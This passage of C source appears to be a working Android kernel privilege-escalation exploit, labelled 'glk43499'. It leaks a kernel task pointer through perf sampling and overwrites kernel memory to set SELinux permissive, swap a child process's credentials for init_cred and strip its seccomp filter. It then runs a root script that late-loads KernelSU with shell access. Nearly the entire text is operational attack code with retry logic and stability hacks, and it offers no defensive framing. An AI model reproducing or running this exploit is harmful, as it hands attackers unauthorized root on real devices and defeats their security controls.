      "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
      "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
      "fi\n"
      "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
      "KSU_READY=0\n"
      "for i in $(seq 1 50); do\n"
      "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
      "  sleep 0.1\n"
      "done\n"
      "if [ \"$KSU_READY\" -ne 1 ]; then\n"
      "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
      "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
      "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
      "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
      "fi\n"
      "else\n"
      "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
      "fi\n",
      cfg->home);
  if (n < 0 || n >= (int)sizeof(script)) {
    pr_warning("root script too long\n");
    close(sfd);
    return;
  }
  if (write(sfd, script, (size_t)n) != n) {
    pr_warning("write root script failed errno=%d\n", errno);
  }
  close(sfd);
  chmod(cfg->root_script, 0755);
}

#ifndef GLK_TEMP_ENTRY
Glk43499Handle *glk43499_handle_create_default(const char *home) {
  Glk43499Config config;
  glk43499_fixed_config_515(&config, home);
  glk43499_write_root_script(&config);

  Glk43499Target target;
  memset(&target, 0, sizeof(target));
  if (glk43499_fixed_target_515(&target) != 0) {
    return NULL;
  }

  Glk43499Env env;
  memset(&env, 0, sizeof(env));
  return glk43499_handle_create(&target, &config, &env);
}
#endif

static int kernelsu_module_loaded(void) {
  FILE *modules = fopen("/proc/modules", "r");
  if (!modules) return 0;

  char line[256];
  int loaded = 0;
  while (fgets(line, sizeof(line), modules)) {
    char name[64];
    if (sscanf(line, "%63s", name) == 1 && strcmp(name, "kernelsu") == 0) {
      loaded = 1;
      break;
    }
  }
  fclose(modules);
  return loaded;
}

/* Find a task through perf sample records. */
static uintptr_t perf_find_task(uintptr_t direct_map_base,
                                uintptr_t direct_map_end,
                                uint32_t sample_period,
                                uint32_t ring_pages, uint32_t spin,
                                uint32_t max_candidates) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = sample_period;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf_event_open failed errno=%d\n", errno);
    return 0;
  }
  size_t msz = 4096 * (1 + ring_pages);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (uint32_t i = 0; i < spin; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * ring_pages;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[max_candidates]; int nc = 0;
  while (pos < head && nc < (int)max_candidates) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < (int)max_candidates; i++) {
          uint64_t v = regs[i];
          /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
          v |= 0x0fULL << 56;
          if (v > direct_map_base && v < direct_map_end)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes {
  int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w;
  const char *root_script;
  uintptr_t direct_map_base;
  uintptr_t direct_map_end;
  uint32_t perf_sample_period;
  uint32_t perf_buffer_pages;
  uint32_t perf_spin;
  uint32_t perf_candidates;
};

/* rooted exits kfree the static init_cred (w2 stores it with no
 * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
static void park_rooted_child(void) {
  FILE *f = fopen("/proc/self/oom_score_adj", "w");
  if (f) {
    fputs("-1000", f);
    fclose(f);
  }
  for (;;) pause();
}

static uintptr_t child_init(struct child_pipes *p) {
  close(p->task_r);
  close(p->cmd_w);
  close(p->uid_r);
  setpgid(0, 0);
  fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);
  prctl(PR_SET_NAME, "ghostleaf_0123456789");

  uintptr_t my_task = perf_find_task(
      p->direct_map_base, p->direct_map_end, p->perf_sample_period,
      p->perf_buffer_pages, p->perf_spin, p->perf_candidates);
  int leak_agreed = 0;
  for (int i = 0; i < 2 && my_task; i++) {
    uintptr_t again = perf_find_task(
        p->direct_map_base, p->direct_map_end, p->perf_sample_period,
        p->perf_buffer_pages, p->perf_spin, p->perf_candidates);
    if (again == my_task) {
      leak_agreed = 1;
      break;
    }
    my_task = again;
  }
  if (!leak_agreed) my_task = 0;
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  return my_task;
}

static void child_cmd_C(struct child_pipes *p) {
  uint32_t uid = getuid();
  write(p->uid_w, &uid, sizeof(uid));
}

static void child_cmd_F(struct child_pipes *p) {
  uint32_t code = 0xffffffff;
  int probe_pipe[2];
  if (pipe(probe_pipe) == 0) {
    pid_t probe = fork();
    if (probe == 0) {
      close(probe_pipe[0]);
      signal(SIGSYS, SIG_DFL);
      errno = 0;
      long r = syscall(__NR_finit_module, 0, 0, 0);
      uint32_t out = (r == 0) ? 0 : (uint32_t)errno;
      ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
      (void)nw;
      _exit(0);
    }
    close(probe_pipe[1]);
    int st = 0;
    if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
      ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
      if (nr != (ssize_t)sizeof(code)) code = 0xfffffffe;
    } else {
      code = 0xfffffffd;
    }
    close(probe_pipe[0]);
  }
  write(p->uid_w, &code, sizeof(code));
}

static void child_cmd_M(struct child_pipes *p) {
  char comm[24] = {0};
  FILE *cf = fopen("/proc/self/comm", "r");
  if (cf) {
    size_t n = fread(comm, 1, sizeof(comm) - 1, cf);
    (void)n;
    fclose(cf);
  }
  size_t len = strlen(comm);
  while (len > 0 && comm[len - 1] == '\n') {
    comm[len - 1] = 0;
    len--;
  }
  uint32_t report = ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
  write(p->uid_w, &report, sizeof(report));
}

static _Noreturn void child_cmd_P(struct child_pipes *p) {
  close(p->cmd_r);
  close(p->uid_w);
  park_rooted_child();
  _exit(0);
}

static int child_handle_cmd(struct child_pipes *p, char cmd) {
  switch (cmd) {
    case 'C': child_cmd_C(p); return 0;
    case 'F': child_cmd_F(p); return 0;
    case 'M': child_cmd_M(p); return 0;
    case 'P': child_cmd_P(p);
    case 'G':
    case 'X': return 1;
    default: return 0;
  }
}

static void child_command_loop(struct child_pipes *p) {
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (child_handle_cmd(p, cmd)) break;
  }
  close(p->cmd_r);
}

static _Noreturn void child_launch_root(struct child_pipes *p) {
  if (getuid() != 0) {
    close(p->uid_w);
    _exit(1);
  }
  for (int fd = 3; fd < 1024; fd++) {
    int fl = fcntl(fd, F_GETFD);
    if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
  }
  pid_t worker = fork();
  if (worker == 0) {
    if (setsid() < 0) _exit(1);
    execl("/system/bin/sh", "sh", p->root_script, NULL);
    _exit(1);
  }
  if (worker < 0) {
    pr_warning("fork() for root shell failed errno=%d; parking rooted child\n",
               errno);
    close(p->uid_w);
    park_rooted_child();
  }
  close(p->uid_w);
  park_rooted_child();
  _exit(0);
}

static void child_main(struct child_pipes *p) {
  uintptr_t my_task = child_init(p);
  if (!my_task) _exit(1);
  child_command_loop(p);
  child_launch_root(p);
}
static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

/* Fork the victim and read back the task pointer perf leaked. */
static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
  pid_t child = spawn_child(p);
  if (child < 0) return -1;
  uintptr_t task = 0;
  ssize_t nr = read(p->task_r, &task, sizeof(task));
  close(p->task_r);
  *task_out = (nr == (ssize_t)sizeof(task)) ? task : 0;
  return child;
}

typedef int (*write_stage_verify_fn)(void *context);

static int retry_write_stage(
    Glk43499Session *s, const char *stage, uintptr_t target, int mode,
    int attempts, useconds_t settle_usec, write_stage_verify_fn verify,
    void *context, int leaf) {
  Glk43499Runtime *rt = &s->rt;
  for (int attempt = 1; attempt <= attempts; attempt++) {
    pr_debug("%s attempt %d/%d\n", stage, attempt, attempts);
    /* the previous attempt's write can land after its verify read; check
     * before paying for another heap spray */
    if (attempt > 1 && verify(context)) return 1;
    if (attempt == 1) slab_drain(s->config.slab_drain_us);
    int prebuilt_ok = 0;
    if (mode == 2 && kernel5_route_selected(&s->target.offsets)) {
      GlkWriteRequest prebuild = make_write_request(
          data_addr(&s->target, s->target.layout.init_cred_image) + 8,
          "W2 fast repair prebuild", 1, 0);
      s->rt.page_base = prepare_good_kernel_page(s, &prebuild);
      if (!s->rt.page_base || !stash_prebuilt_page(s)) {
        pr_warning("W2 fast repair prebuild failed\n");
        discard_prebuilt_page(s);
      } else {
        prebuilt_ok = 1;
        pr_info("W2 fast repair payload prebuilt\n");
      }
    }
    int routed = do_one_write(s, target, stage, mode, leaf);
    if (!routed) {
      discard_prebuilt_page(s);
      pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
      usleep(s->config.retry_write_backoff_us);
      continue;
    }
    if (mode == 2 && kernel5_route_selected(&s->target.offsets) && prebuilt_ok) {
      /* Swap to the already sprayed leaf payload and repair static init_cred
       * immediately, avoiding another multi-second collision search while
       * PID 1 shares the corrupted credential. */
      if (!activate_prebuilt_page(s)) {
        pr_warning("W2 fast repair activation failed\n");
        discard_prebuilt_page(s);
      } else {
        pr_info("W2b: firing prebuilt init_cred+8 repair\n");
        atomic_store(&rt->fast_repair_route, 1);
        GlkWriteRequest repair_req = make_write_request(
            data_addr(&s->target, s->target.layout.init_cred_image) + 8,
            "W2b: prebuilt init_cred+8 repair", 1, 0);
        int repaired = run_main_route_threads(s, &repair_req);
        atomic_store(&rt->fast_repair_route, 0);
        if (!repaired) {
          pr_warning("W2 fast repair route failed; stopping W2 attempts\n");
          return 0;
        }
      }
    }
    if (settle_usec) usleep(settle_usec);
    if (verify(context)) return 1;
    usleep(s->config.retry_write_post_us);
  }
  /* the last write can land after its verify read */
  return verify(context);
}

static int verify_selinux_stage(void *context) {
  (void)context;
  if (!check_selinux_off()) return 0;
  pr_success("SELinux permissive\n");
  return 1;
}

struct w2_stage_context {
  struct child_pipes *pipes;
};

struct w3_stage_context {
  struct child_pipes *pipes;
  int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
};

static int verify_w2_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "C", 1) != 1) return 0;

  uint32_t child_uid = 9999;
  if (read(stage->pipes->uid_r, &child_uid, sizeof(child_uid)) !=
      (ssize_t)sizeof(child_uid)) {
    return 0;
  }
  pr_info("child uid = %u\n", child_uid);
  if (child_uid != 0) return 0;
  pr_success("child is root!\n");
  return 1;
}

static int verify_seccomp_probe_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "F", 1) != 1) return 0;

  uint32_t code = 0;
  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
      (ssize_t)sizeof(code)) {
    return 0;
  }
  pr_info("seccomp finit_module probe = 0x%x\n", code);
  /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
   * With init_cred + permissive SELinux a real probe fails with a normal
   * errno instead. */
  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
      code == 1 || code == 38) {
    return 0;
  }
  pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
  return 1;
}

static int verify_leaf_dir_stage(void *context) {
  struct w3_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;

  uint32_t report = 0;
  if (read(stage->pipes->uid_r, &report, sizeof(report)) !=
      (ssize_t)sizeof(report)) {
    return 0;
  }
  size_t len = (report >> 8) & 0xff;
  unsigned char c0 = (unsigned char)(report & 0xff);
  pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned)len, c0);
  if (len == 8) {
    stage->leaf_to_target8 = 1;
    pr_info("leaf=1 write lands on [target+8]\n");
    return 1;
  }
  if (len == 0) {
    stage->leaf_to_target8 = 0;
    pr_info("leaf=1 write lands on [target]\n");
    return 1;
  }
  if (len == 15) {
    pr_warning("leaf dir probe: comm untouched (write missed the comm field)\n");
    return 0;
  }
  pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned)len, c0);
  return 0;
}

struct exploit_chain {
  struct child_pipes pipes;
  pid_t child;
  pid_t parked_child;
  int parked_cmd_w;
  uintptr_t child_task;
  int child_alive;
  int seccomp_ok;
  int ever_rooted;
};

enum w1_result { W1_CONTINUE, W1_DONE_OK, W1_FAIL };
enum chain_result { CHAIN_W2_FAIL, CHAIN_W3_DONE };

static int exploit_prelude(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  rt->vr_needed = -1;
  disable_rseq_for_thread();
  set_unbuffer();
  signal(SIGPIPE, SIG_IGN);
  set_limit();
  /* P1c: keep the historical pre-route reservation call; the route owns
   * its own backup, while this one keeps low fds stable for the whole run. */
  int stdio_backup[3] = {-1, -1, -1};
  reserve_standard_io(stdio_backup, (int)s->config.select_nfds);

  log_startup_context(s);
  init_p0_profile(&s->target);
  pin_to_core(CORE(s));
  pr_info("main thread running on cpu=%d\n", sched_getcpu());

  timer_reset(s);
  TIMER("exploit start");
  return 0;
}

static int run_phase1_probe(Glk43499Session *s) {
  if (!s->config.phase1_probe) return -1;
  if (!kernel5_route_selected(&s->target.offsets)) {
    pr_error("5.x phase-1 probe requested for a non-5.x profile\n");
    return 1;
  }
  pr_info("5.x phase-1 probe: cycle/stamp/adjust/disarm only\n");
  int ok = kernel5_resident_start(s);
  if (ok) kernel5_resident_stop(s);
  pr_info("5.x phase-1 probe result=%s\n", ok ? "pass" : "fail");
  return ok ? 0 : 1;
}

static enum w1_result run_w1_stage(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  const struct kernel_offsets *t = &s->target.offsets;
  const Glk43499Layout *L = &s->target.layout;
  int selinux_ok = check_selinux_off();
  if (selinux_ok) {
    pr_success("SELinux already permissive\n");
    return W1_CONTINUE;
  }

  if (!enforce_readable()) {
    pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
  }
  TIMER("pre-W1 drain");
  int w1_attempts = (kernel5_route_selected(&s->target.offsets) &&
                     !s->config.resident_5x)
                        ? (int)s->config.w1_kernel5_attempts
                        : (int)s->config.w1_attempts;
  selinux_ok = retry_write_stage(
      s, "W1: SELinux", data_addr(&s->target, SELINUX_ENFORCING), 1, w1_attempts,
      s->config.w1_settle_us, verify_selinux_stage, NULL, 0);
  if (!selinux_ok) {
    pr_warning("Write 1 failed\n");
    kernel5_resident_stop(s);
    return W1_FAIL;
  }
  if (kernel5_route_selected(&s->target.offsets) &&
      !s->config.resident_5x) {
    uintptr_t w1_scratch_poison = rt->page_base + t->mcast_buffer_size;
    if (!quarantine_reclaim_sockets(s)) {
      pr_warning("W1 scratch page quarantine failed\n");
      return W1_FAIL;
    }
    int repaired = 0;
    for (uint32_t repair_try = 1;
         repair_try <= s->config.w1_scratch_repair_attempts;
         repair_try++) {
      pr_info("W1b: private scratch repair attempt %u/%u\n", repair_try,
              s->config.w1_scratch_repair_attempts);
      if (do_one_write(s, w1_scratch_poison,
                       "W1b: private scratch repair", 1, 1)) {
        repaired = 1;
        break;
      }
      usleep(s->config.w3_settle_us);
    }
    if (repaired) {
      pr_success("private scratch repaired; releasing quarantine\n");
      release_quarantined_reclaim_sockets(s);
    } else {
      pr_warning("private scratch repair failed; keeping page quarantined\n");
      return W1_FAIL;
    }
  }
  if (kernel5_route_selected(&s->target.offsets) &&
      s->config.resident_5x) {
    uintptr_t repair =
        (data_addr(&s->target,
                   s->target.layout.kimage_text_base + t->off_mcast_fake_bss) +
         t->mcast_fake_lock_offset) &
        ~(uintptr_t)0x1fffff;
    if (!kernel5_resident_write(
            s, data_addr(&s->target, SELINUX_ENFORCING) + 4, repair)) {
      pr_warning("W1 policycap repair failed\n");
      kernel5_resident_stop(s);
      return W1_FAIL;
    }
  }
  TIMER("Write 1 complete");
  if (s->config.w1_only) {
    pr_success("W1-only diagnostic complete\n");
    return W1_DONE_OK;
  }
  return W1_CONTINUE;
}

static int run_vr_tag_clear(Glk43499Session *s, uintptr_t child_task) {
#ifdef VR_TAG_A_OFF
  Glk43499Runtime *rt = &s->rt;
  if (rt->vr_needed < 0) {
    rt->vr_needed = 1; /* /proc/modules unreadable: assume loaded */
    FILE *m = fopen("/proc/modules", "r");
    if (m) {
      char mod[256];
      rt->vr_needed = 0;
      while (fgets(mod, sizeof(mod), m))
        if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_')) {
          rt->vr_needed = 1;
          break;
        }
      fclose(m);
    }
    pr_info("vr.ko %s\n", rt->vr_needed ? "loaded; clearing tags"
                                     : "not loaded; skipping tag clear");
  }

  int vr_ok = 1;
  if (rt->vr_needed) {
    vr_ok &= do_one_write(s, child_task + TASK_THREAD_INFO_FLAGS_OFF,
                          "VR: flags+tagA", 1, 1);
    if (vr_ok) {
      uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
      vr_ok &= do_one_write(s, tagb_align, "VR: tagB", 1, 1);
    }
    if (vr_ok) {
      pr_success("VR.ko per-task tags cleared\n");
    } else {
      pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
    }
  }
  return vr_ok;
#else
  (void)s;
  (void)child_task;
  return 1;
#endif
}

static int run_w3_attempts(Glk43499Session *s, struct exploit_chain *c,
                           const struct w3_stage_context *w3,
                           struct w2_stage_context *w2) {
  const struct kernel_offsets *t = &s->target.offsets;
  uintptr_t flags_target = w3->leaf_to_target8
      ? c->child_task - 8
      : c->child_task + TASK_THREAD_INFO_FLAGS_OFF;
  uintptr_t mode_target = w3->leaf_to_target8
      ? c->child_task + TASK_SECCOMP_OFF - 8
      : c->child_task + TASK_SECCOMP_OFF;

  for (uint32_t attempt = 1; attempt <= s->config.w3_attempts; attempt++) {
    pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt,
            s->config.w3_attempts);
    if (attempt == 1) slab_drain(s->config.slab_drain_us);
    int routed = do_one_write(s, flags_target, "W3: TIF_SECCOMP", 1, 1);
    if (!routed) {
      pr_warning("W3 attempt %d route failed; backing off\n", attempt);
      usleep(s->config.w3_backoff_us);
      continue;
    }
    usleep(s->config.w3_settle_us);
    routed = do_one_write(s, mode_target, "W3: seccomp mode", 1, 1);
    if (!routed) {
      pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
      usleep(s->config.w3_backoff_us);
      continue;
    }
    usleep(s->config.w3_settle_us);
    int st = 0;
    if (waitpid(c->child, &st, WNOHANG) == c->child) {
      pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
      c->child_alive = 0;
      break;
    }
    if (verify_seccomp_probe_stage(w2)) {
      c->seccomp_ok = 1;
      break;
    }
    usleep(s->config.w3_settle_us);
  }
  return c->seccomp_ok;
}

static enum chain_result run_w2_w3_chain(Glk43499Session *s,
                                         struct exploit_chain *c) {
  const struct kernel_offsets *t = &s->target.offsets;
  struct w2_stage_context w2_context = { .pipes = &c->pipes };

  for (uint32_t round = 1; round <= s->config.w3_chain_rounds; round++) {
    if (round > 1) {
      pr_warning("W3 chain retry %u/%u: parking rooted child\n", round,
                 s->config.w3_chain_rounds);
      if (c->child > 0 && c->child_alive) {
        write(c->pipes.cmd_w, "P", 1);
        usleep(s->config.w3_settle_us);
        c->parked_child = c->child;
        c->parked_cmd_w = c->pipes.cmd_w;
      } else {
        close(c->pipes.cmd_w);
      }
      close(c->pipes.uid_r);
      c->child_alive = 1;
      c->seccomp_ok = 0;
    }

    c->child = spawn_victim(&c->pipes, &c->child_task);
    if (c->child < 0) {
      pr_warning("fork failed\n");
      return CHAIN_W2_FAIL;
    }
    TIMER("perf_find_task done");

    if (!c->child_task) {
      pr_warning("perf leak did not reproduce; retrying next round\n");
      kill(-c->child, SIGKILL);
      waitpid(c->child, NULL, 0);
      c->child_alive = 0;
      close(c->pipes.cmd_w);
      close(c->pipes.uid_r);
      continue;
    }

    pr_debug("child_pid=%d child_task=0x%016zx\n", c->child, c->child_task);
    run_vr_tag_clear(s, c->child_task);

    int got_root = retry_write_stage(
        s, "W2: cred", c->child_task + TASK_CRED_OFF, 2,
        s->config.w2_attempts, s->config.w2_settle_us,
        verify_w2_stage, &w2_context, 0);
    if (!got_root) {
      write(c->pipes.cmd_w, "X", 1);
      close(c->pipes.cmd_w);
      close(c->pipes.uid_r);
      pr_warning("W2 failed after %u rounds\n", s->config.w2_attempts);
      waitpid(c->child, NULL, WNOHANG);
      return CHAIN_W2_FAIL;
    }
    c->ever_rooted = 1;

    if (!process_has_seccomp()) {
      pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
      c->seccomp_ok = 1;
      break;
    }

    int tcp_writes = tcp_route_selected(&s->target.offsets, s->config.tcp_route);
    struct w3_stage_context w3_context = {
      .pipes = &c->pipes,
      .leaf_to_target8 = !tcp_writes,
    };
    if (!tcp_writes) {
      int dir_ok = retry_write_stage(
          s, "W3-0: leaf dir", c->child_task + TASK_COMM_OFF, 1,
          s->config.w3_dir_attempts, s->config.w3_settle_us,
          verify_leaf_dir_stage, &w3_context, 1);
      if (!dir_ok) {
        pr_warning("W3 leaf direction probe failed; retiring child\n");
        continue;
      }
    }

    run_w3_attempts(s, c, &w3_context, &w2_context);
    if (!c->seccomp_ok) {
      pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
      continue;
    }
    pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
    break;
  }

  if (!c->seccomp_ok) {
    pr_warning("W3 seccomp bypass failed after configured chain rounds; ksud late-load will likely stay blocked\n");
  }
  return CHAIN_W3_DONE;
}

static int run_post_root(Glk43499Session *s, struct exploit_chain *c) {
  sleep(s->config.post_root_settle_sec);
  TIMER("exploit complete");
  if (!c->ever_rooted) {
    pr_error("w2 never rooted a child\n");
    return 1;
  }
  if (c->child_alive) {
    if (write(c->pipes.cmd_w, "G", 1) != 1)
      pr_warning("failed to start root shell (child exited early)\n");
    close(c->pipes.cmd_w);
    waitpid(c->child, NULL, WNOHANG);
    if (c->parked_cmd_w >= 0) close(c->parked_cmd_w);
  } else if (c->parked_child > 0) {
    if (write(c->parked_cmd_w, "G", 1) != 1)
      pr_warning("failed to start root shell (parked child exited)\n");
    close(c->parked_cmd_w);
    waitpid(c->parked_child, NULL, WNOHANG);
    c->parked_cmd_w = -1;
  } else {
    pr_warning("skipping late-load: child died during W3\n");
  }
  close(c->pipes.uid_r);

  int kernelsu_ready = 0;
  for (uint32_t i = 0;
       i < s->config.ksu_module_poll_rounds &&
       !(kernelsu_ready = kernelsu_module_loaded()); i++) {
    usleep(s->config.ksu_poll_us);
  }
  int ksu_log_loaded = 0;
  int ksu_log_failed = 0;
  for (uint32_t i = 0;
       i < s->config.ksu_log_poll_rounds &&
       !(ksu_log_loaded || ksu_log_failed); i++) {
    FILE *lf = fopen(s->config.ksu_log, "r");
    if (lf) {
      char line[256];
      while (fgets(line, sizeof(line), lf)) {
        if (strstr(line, "[+] KernelSU module loaded") ||
            strstr(line, "[+] KernelSU already loaded"))
          ksu_log_loaded = 1;
        if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
      }
      fclose(lf);
    }
    if (!(ksu_log_loaded || ksu_log_failed)) usleep(s->config.ksu_log_wait_us);
  }
  int enforce_ok = 0;
  for (uint32_t i = 0;
       ksu_log_loaded && !enforce_ok &&
       i < s->config.enforce_poll_rounds; i++) {
    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    if (efd < 0) {
      enforce_ok = 1;
      break;
    }
    char eb[4] = {0};
    ssize_t rn = read(efd, eb, sizeof(eb));
    close(efd);
    if (rn > 0 && eb[0] == '1') enforce_ok = 1;
    if (!enforce_ok) usleep(s->config.enforce_wait_us);
  }
  if (enforce_ok)
    pr_info("enforce=1 (enforcing)\n");
  else if (ksu_log_loaded)
    pr_warning("enforce=0 (still permissive)\n");
  kernelsu_ready = kernelsu_ready || ksu_log_loaded;

  if (kernelsu_ready)
    pr_success("KernelSU ready\n");
  else if (ksu_log_failed)
    pr_warning("KernelSU module load failed\n");
  else if (c->seccomp_ok)
    pr_warning("temporary root ready; KernelSU module load pending\n");
  else
    pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
  return 0;
}

int run_exploit(Glk43499Session *s) {
  exploit_prelude(s);

  int probe = run_phase1_probe(s);
  if (probe >= 0) return probe;

  enum w1_result w1 = run_w1_stage(s);
  if (w1 == W1_FAIL) return 1;
  if (w1 == W1_DONE_OK) return 0;

  slab_drain(s->config.slab_drain_us);
  TIMER("pre-W2 drain");

  struct exploit_chain c;
  memset(&c, 0, sizeof(c));
  c.pipes.root_script = s->config.root_script;
  c.pipes.direct_map_base = s->target.layout.direct_map_base;
  c.pipes.direct_map_end = s->target.layout.direct_map_end;
  c.pipes.perf_sample_period = s->config.perf_sample_period;
  c.pipes.perf_buffer_pages = s->config.perf_buffer_pages;
  c.pipes.perf_spin = s->config.perf_spin;
  c.pipes.perf_candidates = s->config.perf_candidates;
  c.child = -1;
  c.parked_child = -1;
  c.parked_cmd_w = -1;
  c.child_alive = 1;

  if (run_w2_w3_chain(s, &c) == CHAIN_W2_FAIL) return 1;
  if (run_post_root(s, &c)) return 1;

  kernel5_resident_stop(s);
  return 0;
}
/**
 * @brief Create a 43499 session around the already-selected offsets.
 * @return run_exploit() result, or 1 when session creation fails.
 * @note P1b-1 only installs the handle; run_exploit still uses the legacy
 *       globals until P1b-2/P1c/P1d move them. This is a mechanical change.
 */
#ifndef GLK_TEMP_ENTRY
static int run_with_session(void) {
  Glk43499Handle *handle = glk43499_handle_create_default(NULL);
  if (!handle) {
    pr_error("session create failed\n");
    return 1;
  }
  int rc = glk43499_handle_run(handle);
  glk43499_handle_destroy(handle);
  return rc;
}

int main(int argc, char **argv) {
  (void)argc;
  (void)argv;
  set_unbuffer();
  return run_with_session();
}
#endif
